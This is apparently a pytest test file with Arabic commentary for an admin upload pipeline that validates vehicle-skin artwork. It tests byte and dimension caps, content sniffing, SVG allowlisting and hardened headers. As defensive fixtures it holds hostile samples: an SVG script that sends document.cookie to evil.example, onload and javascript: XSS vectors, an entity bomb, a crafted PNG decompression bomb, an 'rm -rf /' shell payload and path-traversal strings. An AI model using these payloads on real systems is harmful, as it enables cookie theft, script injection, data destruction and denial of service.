"""بابُ رسومات المركبات — **الحالاتُ الأربعُ تُقاس ولا تُوصف** (2026-08-22).

**ومجالٌ جديدٌ بلا حارسٍ سابق**: كلُّ ما رُفع في هذا المشروع قبل اليوم كان
وثيقةً تُراجَع أو صورةَ وجه، **ولا واحدةٌ منها تُخدَم لمتصفحٍ كملفٍّ قد
يُفسَّر**. ورسمةُ المركبة تُخدَم للجميع وقد تكون SVG — **وهي مستندٌ برمجيٌّ
كامل لا صورة**.

**والأربعُ التي يقيسها هذا الملف** — وكلٌّ منها يقع من بابٍ مختلف:

| الحال | البابُ الذي يمسكها | ولمَ لا يكفي غيرُه |
|---|---|---|
| صورةٌ تالفة | `Image.open` يفشل ← `UnsupportedDocument` | التوقيعُ سليمٌ فلا يمسكها الشمّ |
| **حجمٌ** فوق السقف | `read_capped` **على دفعات** | `Content-Length` يكتبه العميل |
| **أبعادٌ** فوق السقف | فحصُ `size` **قبل `load()`** | ملفٌّ بضعِ كيلوباياتٍ يُفكّ إلى غيغابايتات — **والسقفُ الأول لا يراه** |
| ملفٌّ يدّعي أنه صورة | `storage.sniff` على البايتات | الترويسةُ تقول `image/png` وتكذب |
| **SVG فيه سكربت** | قائمةُ السماح ثم إعادةُ الكتابة | لا توقيعَ ثنائيَّ لنصّ، والحذفُ النصّيُّ يُبقي ما لم يخطر ببال كاتبه |
"""

from __future__ import annotations

import io
import struct
import zlib

import pytest
from httpx import AsyncClient
from PIL import Image

from app.core.exceptions import DocumentTooLarge, UnsupportedDocument
from app.services import skin_artwork
from app.services.skin_artwork import UnsafeArtwork

# **ولا `pytestmark` هنا**: المشروعُ على `pytest-asyncio` بـ`asyncio_mode = auto`
# (`pytest.ini`)، فالدوالُّ غيرُ المتزامنة تُجمَع وحدَها. وكان هذا السطرُ
# `pytest.mark.anyio` فيوجّه الملفَّ إلى مُلحق anyio، و`anyio_backend` عنده
# **مداه الوحدة** بينما `client` في `conftest` **مداه الجلسة** — فسقطت تهيئةُ
# **تسعةٍ وعشرين** اختباراً بـ`ScopeMismatch` قبل أن يُنفَّذ سطرٌ واحدٌ منها.
# **وهو ملفٌّ لم يُشغَّل قطّ حتى اليوم**، وهذا ما يخفيه «مكتوبٌ» عن «مقيس».


# ═══════════════════════════════════════════════════════ أدواتُ القياس


class CountingReader:
    """قارئٌ **يعدّ دفعاتِه** — فيُقاس أن السقفَ يُفرض بالقراءة لا بالثقة."""

    def __init__(self, data: bytes) -> None:
        self._buffer = io.BytesIO(data)
        self.reads = 0
        self.bytes_served = 0

    async def read(self, size: int = -1) -> bytes:
        chunk = self._buffer.read(size)
        self.reads += 1
        self.bytes_served += len(chunk)
        return chunk


def png(width: int, height: int, *, margin: int = 0) -> bytes:
    """صورةٌ حقيقيةٌ بشفافية — ومربّعٌ ملوّنٌ داخل هامشٍ شفّاف."""
    canvas = Image.new("RGBA", (width, height), (0, 0, 0, 0))
    canvas.paste(
        Image.new("RGBA", (width - margin * 2, height - margin * 2), (200, 60, 60, 255)),
        (margin, margin),
    )
    buffer = io.BytesIO()
    canvas.save(buffer, format="PNG")
    return buffer.getvalue()


def png_header_claiming(width: int, height: int) -> bytes:
    """**ترويسةُ PNG وحدَها تدّعي أبعاداً هائلة** — قنبلةُ فكِّ ضغطٍ بلا حجم.

    وهي ما يجعل السقفَ الثاني ضرورةً لا زينة: هذا الملفُّ **٦٧ بايتاً**،
    ويمرّ من كلِّ فحصٍ يقيس الحجم، ويطلب من الخادم أن يحجز مساحةَ ٩٠٠ مليون
    بكسل.
    """
    def block(kind: bytes, body: bytes) -> bytes:
        return (
            struct.pack(">I", len(body))
            + kind
            + body
            + struct.pack(">I", zlib.crc32(kind + body) & 0xFFFFFFFF)
        )

    ihdr = struct.pack(">IIBBBBB", width, height, 8, 6, 0, 0, 0)
    # **و`IDAT` لازمةٌ ولو كانت خردة**: `Image.open` يقرأ الكتلَ حتى يبلغ
    # أوّلَ `IDAT` ثم يقف، **فترويسةٌ وحدَها لا يعرفها PIL أصلاً** ويرفعُ
    # `UnidentifiedImageError`. وبغيرها يقيس هذا الاختبارُ **بابَ «صورةٌ
    # تالفة»** ويظنّ نفسَه يقيس بابَ الأبعاد — أي يمرّ أخضرَ على حارسٍ لم
    # يبلغه قطّ. (وقع مقيساً في أوّل تشغيلٍ لهذا الملف، 2026-08-22.)
    return (
        b"\x89PNG\r\n\x1a\n"
        + block(b"IHDR", ihdr)
        + block(b"IDAT", zlib.compress(b"\x00" * 8))
        + block(b"IEND", b"")
    )


SVG_WITH_SCRIPT = b"""<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <rect width="100" height="100" fill="#c9971f"/>
  <script>fetch('https://evil.example/'+document.cookie)</script>
</svg>"""

SVG_WITH_HANDLER = b"""<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <circle cx="50" cy="50" r="40" fill="#1d6b52" onload="alert(document.domain)"/>
</svg>"""

SVG_WITH_FOREIGN = b"""<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <foreignObject width="100" height="100"><body xmlns="http://www.w3.org/1999/xhtml">
  <iframe src="javascript:alert(1)"></iframe></body></foreignObject>
</svg>"""

SVG_WITH_EXTERNAL = b"""<svg xmlns="http://www.w3.org/2000/svg"
  xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 100 100">
  <image xlink:href="https://evil.example/beacon.png" width="10" height="10"/>
</svg>"""

SVG_WITH_REMOTE_FILL = b"""<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <rect width="100" height="100" fill="url(https://evil.example/p.svg#x)"/>
</svg>"""

SVG_WITH_ENTITY_BOMB = b"""<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;">]>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><title>&b;</title></svg>"""

SVG_CLEAN = b"""<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 210">
  <defs><linearGradient id="g"><stop offset="0" stop-color="#fff"/></linearGradient></defs>
  <path d="M 10 10 L 90 10 L 90 90 Z" fill="url(#g)" stroke="#111" stroke-width="2"/>
</svg>"""


# ═══════════════════════════ ١) صورةٌ تالفة — التوقيعُ سليمٌ والمحتوى ليس


async def test_a_corrupt_image_is_refused_by_name_not_by_a_five_hundred() -> None:
    """**توقيعٌ سليمٌ وجسمٌ خردة**: الشمُّ يمرّرها، والفكُّ هو ما يمسكها.

    **والمهمُّ أنها ٤٢٢ لا ٥٠٠**: عطبٌ في ملفِّ المستخدم ليس عطباً فينا،
    و٥٠٠ يوقظ أحداً في الليل لأن مشرفاً رفع ملفاً نصفَه.
    """
    corrupt = b"\x89PNG\r\n\x1a\n" + b"\x17" * 400
    with pytest.raises(UnsupportedDocument):
        skin_artwork.render(corrupt)


# ═══════════ ٢) الحجم — يُفرض **بالقراءة على دفعات** لا بـ`Content-Length`


async def test_the_byte_cap_stops_reading_instead_of_swallowing_the_file() -> None:
    """**ويُقاس أنه توقّف مبكراً** — لا أنه رفض بعد أن ابتلع كلَّ شيء.

    الفرقُ ليس تجميلياً: من يقرأ الملفَّ كلَّه ثم يقيسه **قد ابتلعه فعلاً**،
    فالسقفُ حينها رسالةٌ لا حماية. ومن يقف عند التجاوز لا يحجز إلا ما قرأ.
    """
    oversized = b"\x00" * (skin_artwork.MAX_UPLOAD_BYTES + 3 * 1024 * 1024)
    reader = CountingReader(oversized)

    with pytest.raises(DocumentTooLarge):
        await skin_artwork.read_capped(reader)

    # **قِيس**: ما خرج من القارئ لا يتجاوز السقفَ إلا بدفعةٍ واحدة
    assert reader.bytes_served <= skin_artwork.MAX_UPLOAD_BYTES + 64 * 1024
    assert reader.bytes_served < len(oversized)


# ═══════ ٣) الأبعاد — سقفٌ ثانٍ، **والأولُ لا يغني عنه** (قنبلةُ فكِّ ضغط)


async def test_a_tiny_file_claiming_enormous_dimensions_is_refused() -> None:
    """**٦٧ بايتاً تطلب ٩٠٠ مليون بكسل** — ويمرّ من كلِّ فحصٍ يقيس الحجم.

    وهذا هو الدليلُ على أن السقفين اثنان لا واحد: هذا الملفُّ **تحت سقف
    البايتات بكثير**، ولولا فحصُ الأبعاد **قبل `load()`** لحجز الخادمُ ذاكرةً
    لا يملكها — إسقاطُ خدمةٍ بملفٍّ أصغرَ من هذه الفقرة.
    """
    bomb = png_header_claiming(30_000, 30_000)
    assert len(bomb) < 1024, "الملفُّ يجب أن يبقى صغيراً — وإلا قاس السقفَ الأول"

    with pytest.raises(DocumentTooLarge):
        skin_artwork.render(bomb)


# ═══════════ ٤) ملفٌّ يدّعي أنه صورة — **الحكمُ على البايتات لا الترويسة**


@pytest.mark.parametrize(
    "payload",
    [
        pytest.param(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n", id="pdf"),
        pytest.param(b"GIF89a" + b"\x00" * 40, id="gif-unsupported"),
        pytest.param(b"#!/bin/sh\nrm -rf /\n", id="shell-script"),
        pytest.param(b"MZ\x90\x00" + b"\x00" * 60, id="windows-executable"),
    ],
)
async def test_a_file_that_merely_claims_to_be_an_image_is_refused(
    payload: bytes,
) -> None:
    """`Content-Type` حقلٌ يكتبه العميل — **فالحكمُ على أوّل بايتاته**."""
    with pytest.raises(UnsupportedDocument):
        skin_artwork.render(payload)


# ═══════════════════════ ٥) SVG — **وهو الأهمّ**: قائمةُ سماحٍ ثم إعادةُ كتابة


@pytest.mark.parametrize(
    "payload",
    [
        pytest.param(SVG_WITH_SCRIPT, id="script"),
        pytest.param(SVG_WITH_HANDLER, id="onload"),
        pytest.param(SVG_WITH_FOREIGN, id="foreignObject"),
        pytest.param(SVG_WITH_EXTERNAL, id="xlink-href"),
        pytest.param(SVG_WITH_REMOTE_FILL, id="remote-url-in-fill"),
        pytest.param(SVG_WITH_ENTITY_BOMB, id="entity-bomb"),
    ],
)
async def test_an_svg_carrying_anything_executable_is_refused_whole(
    payload: bytes,
) -> None:
    """**تُرفض كاملةً ولا تُنظَّف**.

    ولو نُقّيت وقُبلت لَما عرف رافعُها أن ملفَه حمل سكربتاً — وقبولُ نصفِه
    **يخفي أنه كان هناك**، وهي قاعدةُ «وجدانُ سرٍّ يوقف ولا يُنظَّف».
    """
    with pytest.raises(UnsupportedDocument):
        skin_artwork.render(payload)


async def test_a_clean_svg_survives_and_carries_both_declared_sizes() -> None:
    """**والاتجاهُ الثاني**: رسمةٌ سليمةٌ تمرّ — وحارسٌ يرفض كلَّ شيءٍ ليس حارساً."""
    art = skin_artwork.render(SVG_CLEAN)
    assert art.media_type == "image/svg+xml"
    assert b'width="512"' in art.store
    assert b'width="128"' in art.map
    # **`viewBox` واحدةٌ للمقاسين** — وإلا رُسمت المركبةُ مقصوصةً في أحدهما
    assert b'viewBox="0 0 400 210"' in art.store
    assert b'viewBox="0 0 400 210"' in art.map
    assert b"linearGradient" in art.store, "التدرّجُ مسموحٌ فلا يُحذف"


async def test_the_output_is_rewritten_not_filtered() -> None:
    """**إعادةُ كتابةٍ لا حذفٌ نصّيّ**: ما ليس في القائمة **لا يُكتب أصلاً**.

    والفرقُ يُقاس: عنصرٌ زخرفيٌّ غيرُ معروفٍ (`metadata`) يسقط بالسكوت، ولا
    يبقى منه اسمُه في المُخرَج — بينما التنقيةُ النصّية تُبقي ما لم تعرفه.
    """
    payload = (
        b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">'
        b"<metadata>bureau</metadata>"
        b'<rect width="10" height="10" fill="#fff" data-owner="bureau"/>'
        b"</svg>"
    )
    art = skin_artwork.render(payload)
    assert b"metadata" not in art.store
    assert b"bureau" not in art.store
    assert b"data-owner" not in art.store
    assert b"rect" in art.store


# ═══════════════════ ٦) القصُّ والمقاسان — ما يقع فعلاً على صورةٍ نقطية


async def test_transparent_margins_are_trimmed_and_both_sizes_are_fixed() -> None:
    """توليداتُ الذكاء الاصطناعي تترك فراغاً **مختلفاً حول كلِّ واحدة**.

    وبغير القصّ تُرسم مركبتان بنفس المقاس **بحجمين مختلفين على الخريطة**،
    ولا يُقرأ الفرقُ عطباً بل «هذه المركبةُ أصغر».
    """
    art = skin_artwork.render(png(600, 600, margin=200))

    assert art.media_type == "image/webp"
    assert art.source_size == (600, 600)
    # **قُصَّ فعلاً** — والقيمةُ تُعرض للمشرف، فالقصُّ الصامتُ يُقرأ خطأً
    assert art.trimmed == (200, 200, 400, 400)

    with Image.open(io.BytesIO(art.store)) as store:
        assert store.size == (skin_artwork.STORE_PX, skin_artwork.STORE_PX)
    with Image.open(io.BytesIO(art.map)) as mapped:
        assert mapped.size == (skin_artwork.MAP_PX, skin_artwork.MAP_PX)

    # **ورسمةُ الخريطة أخفُّ بكثير** — عشراتُ الكباتن على شاشةٍ واحدة
    assert len(art.map) < len(art.store)


async def test_two_drawings_with_different_margins_come_out_the_same_size() -> None:
    """**وهذا هو الغرضُ من القصّ**، لا تصغيرُ الملفّ.

    مربّعان متطابقان بهامشين مختلفين يجب أن **يُرسما بالحجم نفسِه** — وبغير
    القصّ يخرج أحدُهما ثلثَ الآخر.
    """
    tight = skin_artwork.render(png(400, 400, margin=20))
    loose = skin_artwork.render(png(400, 400, margin=150))

    def ink(data: bytes) -> tuple[int, int, int, int] | None:
        with Image.open(io.BytesIO(data)) as image:
            return image.convert("RGBA").getchannel("A").getbbox()

    # الفارقُ لا يتجاوز بكسلاً من تقريب `thumbnail`
    for a, b in zip(ink(tight.map), ink(loose.map)):
        assert abs(a - b) <= 1, "هامشان مختلفان أخرجا حجمين — القصُّ لا يعمل"


# ═══════════════ ٧) رسوماتُ الحزمة نفسُها تمرّ من قائمة السماح


async def test_every_bundled_drawing_passes_the_same_allowlist() -> None:
    """**رسوماتُنا ليست معفاةً** — والمولّدُ قد يُعدَّل بيدٍ يوماً.

    ورسمةٌ تُضاف إلى المجلَّد وتحمل `use` أو مرجعاً خارجياً تُسقط هذا
    الاختبار قبل أن تُخدَم لأحد.
    """
    assets = skin_artwork.bundled_assets()
    assert len(assets) >= 15, f"المنظومةُ ناقصة — وُجد {len(assets)}"

    for row in assets:
        for slot in ("store", "map"):
            path = skin_artwork.bundled_path(row["key"], slot)  # type: ignore[arg-type]
            art = skin_artwork.render(path.read_bytes())
            assert art.media_type == "image/svg+xml"


async def test_the_manifest_and_the_folder_do_not_drift() -> None:
    """**نصفُ زوجٍ لا يُقبل**: مركبةٌ برسمةِ متجرٍ بلا رسمةِ خريطةٍ تُرسم في
    المتجر وتختفي على الخريطة — ولا يُكتشف ذلك إلا في يدِ كبتن."""
    for row in skin_artwork.bundled_assets():
        assert row["name"].strip(), f"{row['key']} بلا اسمٍ عربيّ"
        assert row["rarity"] in {"common", "premium", "rare", "legendary"}


# ═══════════════════ ٨) الترويساتُ المتصلّبة — تُقاس على السلك


async def test_the_serving_headers_are_hardened_for_every_kind() -> None:
    """**والعرضُ عبر `<img>` لا يكفي حارساً**: التنقّلُ المباشر يفتحه مستنداً.

    فالترويساتُ هي ما يغلق ذلك المسار — وتُقاس هنا **قيمةً قيمة**، لا يُكتفى
    بوجودها: `sandbox` بلا قيمةٍ هي ما يجعل الأصلَ معتماً، وحذفُها يترك
    `default-src` وحدَه وهو لا يمنع الملاحة.
    """
    for media_type in ("image/svg+xml", "image/webp"):
        headers = skin_artwork.hardened_headers(media_type)
        policy = headers["Content-Security-Policy"]
        assert "default-src 'none'" in policy
        assert "sandbox" in policy
        assert headers["X-Content-Type-Options"] == "nosniff"
        # **التخبئةُ عامّةٌ عمداً** — الرسمةُ لا تحمل هويةَ أحد، بخلاف الوثيقة
        assert headers["Cache-Control"].startswith("public, max-age=")
        assert "no-store" not in headers["Cache-Control"]


# ═══════════════════ ٩) السلسلةُ كاملةً عبر أبواب اللوحة


async def _create(client: AsyncClient, admin_headers: dict[str, str]) -> str:
    answer = await client.post(
        "/admin/vehicle-skins",
        headers=admin_headers,
        json={"name": "مركبةُ القياس", "rarity": "premium", "prices": []},
    )
    assert answer.status_code == 201, answer.text
    return answer.json()["id"]


async def test_the_preview_door_writes_nothing_and_returns_the_processed_drawing(
    client: AsyncClient, admin_headers: dict[str, str]
) -> None:
    """**تجربةٌ جافّةٌ بنفس السلسلة** — وهي ما يجعل معاينةَ اللوحة صادقة.

    ومعاينةٌ ترسم **الملفَّ الخام** تُري المشرفَ حجماً غيرَ الذي سيُرسم، فيضبط
    نسبةَ العرض على ما لن يقع.
    """
    answer = await client.put(
        "/admin/vehicle-skins/artwork/preview",
        headers=admin_headers,
        files={"file": ("car.png", png(500, 300, margin=100), "image/png")},
    )
    assert answer.status_code == 200, answer.text
    body = answer.json()
    assert body["media_type"] == "image/webp"
    assert body["store_image"].startswith("data:image/webp;base64,")
    assert body["map_image"].startswith("data:image/webp;base64,")
    assert body["source_size"] == [500, 300]
    assert body["trimmed"] == [100, 100, 400, 200]


async def test_a_lying_content_type_does_not_get_through_the_real_door(
    client: AsyncClient, admin_headers: dict[str, str]
) -> None:
    """**الترويسةُ تقول `image/png` والبايتاتُ تقول سكربتَ صدفة.**"""
    answer = await client.put(
        "/admin/vehicle-skins/artwork/preview",
        headers=admin_headers,
        files={"file": ("car.png", b"#!/bin/sh\necho hi\n", "image/png")},
    )
    assert answer.status_code == 422, answer.text
    assert answer.json()["code"] == "unsupported_document"


async def test_an_svg_with_a_script_is_refused_at_the_real_door(
    client: AsyncClient, admin_headers: dict[str, str]
) -> None:
    """**البابُ الحقيقيُّ لا الدالّةُ وحدَها** — ورمزُ الخطأ يسمّي السبب."""
    skin_id = await _create(client, admin_headers)
    answer = await client.put(
        f"/admin/vehicle-skins/{skin_id}/artwork",
        headers=admin_headers,
        files={"file": ("evil.svg", SVG_WITH_SCRIPT, "image/svg+xml")},
    )
    assert answer.status_code == 422, answer.text
    assert answer.json()["code"] == "unsafe_artwork"


async def test_uploaded_artwork_is_served_with_the_hardened_headers(
    client: AsyncClient, admin_headers: dict[str, str]
) -> None:
    """السلسلةُ كاملةً: إنشاءٌ ← رفعٌ ← عَرضٌ — **وتُقرأ الترويساتُ من الردّ**."""
    skin_id = await _create(client, admin_headers)

    uploaded = await client.put(
        f"/admin/vehicle-skins/{skin_id}/artwork",
        headers=admin_headers,
        files={"file": ("car.png", png(420, 260, margin=60), "image/png")},
    )
    assert uploaded.status_code == 200, uploaded.text
    row = uploaded.json()
    assert row["store_image_url"].endswith("/artwork/store")
    assert row["map_image_url"].endswith("/artwork/map")

    for slot in ("store", "map"):
        served = await client.get(
            f"/admin/vehicle-skins/{skin_id}/artwork/{slot}",
            headers=admin_headers,
        )
        assert served.status_code == 200
        assert served.headers["content-type"] == "image/webp"
        assert "sandbox" in served.headers["content-security-policy"]
        assert served.headers["x-content-type-options"] == "nosniff"
        assert served.headers["cache-control"].startswith("public, max-age=")


async def test_a_bundled_drawing_can_be_attached_without_any_upload(
    client: AsyncClient, admin_headers: dict[str, str]
) -> None:
    """**ولولا هذا البابُ لكانت ستَّ عشرةَ رسمةً في الحزمة لا يصل إليها زرّ.**"""
    skin_id = await _create(client, admin_headers)

    listed = await client.get(
        "/admin/vehicle-skins/assets", headers=admin_headers
    )
    assert listed.status_code == 200
    keys = [row["key"] for row in listed.json()]
    assert "sedan-ash" in keys, "مركبةُ الهدية/البديلِ المنشور غائبةٌ عن المنظومة"

    attached = await client.put(
        f"/admin/vehicle-skins/{skin_id}/asset/sedan-ash",
        headers=admin_headers,
    )
    assert attached.status_code == 200, attached.text

    served = await client.get(
        f"/admin/vehicle-skins/{skin_id}/artwork/map", headers=admin_headers
    )
    assert served.status_code == 200
    assert served.headers["content-type"] == "image/svg+xml"
    assert "sandbox" in served.headers["content-security-policy"]

    # **مفتاحٌ لا وجودَ له لا يفتح ملفاً** — ولا يخرج من الجذر
    for bad in ("../../../etc/passwd", "sedan-ash/../../secrets"):
        refused = await client.put(
            f"/admin/vehicle-skins/{skin_id}/asset/{bad}",
            headers=admin_headers,
        )
        assert refused.status_code in (404, 422), refused.text


async def test_uploading_over_a_bundled_asset_clears_the_other_column(
    client: AsyncClient, admin_headers: dict[str, str]
) -> None:
    """**العمودان لا يجتمعان** (`models/vehicle_skin.py`): مرفوعةٌ **أو** مشحونة.

    وبغير المسح تحمل المركبةُ مصدرين، **ويقرّر ترتيبُ الشرط في
    `artwork_response` أيَّهما يُرى** — أي أن الرسمةَ المعروضةَ تصير أثراً
    جانبياً لسطرٍ في دالّة.
    """
    skin_id = await _create(client, admin_headers)
    await client.put(
        f"/admin/vehicle-skins/{skin_id}/asset/sedan-ash",
        headers=admin_headers,
    )
    await client.put(
        f"/admin/vehicle-skins/{skin_id}/artwork",
        headers=admin_headers,
        files={"file": ("car.png", png(300, 300, margin=30), "image/png")},
    )
    served = await client.get(
        f"/admin/vehicle-skins/{skin_id}/artwork/store", headers=admin_headers
    )
    assert served.headers["content-type"] == "image/webp", (
        "بقيت الرسمةُ المشحونةُ تُخدَم بعد رفعِ بديلها"
    )


async def test_the_catalogue_sums_in_the_database_and_quantizes_its_money(
    client: AsyncClient, admin_headers: dict[str, str]
) -> None:
    """**§14: اللوحةُ لا تجمع صفوفاً** — والصفرُ يُسلسَل `"0.000"` لا `"0"`.

    وهو الشكلُ السابع: قيمةٌ تُكوَّن في بايثون تفقد تكميمَها، فيقرأ المشرفُ
    صفراً عارياً في عمودٍ كلُّه ثلاثُ خانات.
    """
    skin_id = await _create(client, admin_headers)
    priced = await client.patch(
        f"/admin/vehicle-skins/{skin_id}",
        headers=admin_headers,
        json={"prices": [{"country_code": "JO", "price": "12.500"}]},
    )
    assert priced.status_code == 200, priced.text
    assert priced.json()["prices"][0]["price"] == "12.500"

    stats = await client.get(
        "/admin/vehicle-skins/stats", headers=admin_headers
    )
    assert stats.status_code == 200, stats.text
    body = stats.json()
    assert body["total_owned"] == 0
    for amount in body["revenue_by_currency"].values():
        assert amount.count(".") == 1 and len(amount.split(".")[1]) == 3


async def test_a_duplicate_market_in_one_price_list_is_named_not_crashed(
    client: AsyncClient, admin_headers: dict[str, str]
) -> None:
    """خطأُ قاعدةٍ خامٌّ بالإنجليزية ليس رسالةً — والمشرفُ لا يعرف ما يُصلح."""
    skin_id = await _create(client, admin_headers)
    answer = await client.patch(
        f"/admin/vehicle-skins/{skin_id}",
        headers=admin_headers,
        json={
            "prices": [
                {"country_code": "JO", "price": "5.000"},
                {"country_code": "JO", "price": "9.000"},
            ]
        },
    )
    assert answer.status_code == 422, answer.text
    assert answer.json()["code"] == "invalid_input"


async def test_support_cannot_price_a_vehicle(
    client: AsyncClient, support_headers: dict[str, str]
) -> None:
    """**سعرٌ وكميّةٌ قرارٌ ماليّ لا إجراءُ دعم** (القسم ١٣/٨)."""
    answer = await client.get(
        "/admin/vehicle-skins", headers=support_headers
    )
    assert answer.status_code == 403
